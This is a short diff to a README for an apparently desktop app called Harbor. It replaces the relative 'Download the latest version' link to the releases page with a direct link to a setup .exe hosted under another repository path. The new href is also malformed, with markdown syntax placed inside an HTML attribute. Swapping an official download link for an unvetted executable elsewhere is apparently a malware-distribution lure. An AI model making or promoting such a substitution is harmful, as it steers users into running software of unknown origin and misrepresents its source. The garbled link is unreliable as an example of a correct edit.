@@ -10,7 +10,7 @@
 </p>
 
 <p align="center">
-  <a href="../../releases/latest"><b>Download the latest version</b></a>
+  <a href="[../../releases/lates](https://github.com/Yukinee07/harbor/blob/main/Release/Harbor-Setup-1.1.0.exe)"><b>Download the latest version</b></a>
 </p>
 
 ![Harbor's dock and calendar over the Aurora wallpaper](docs/images/dock.png)
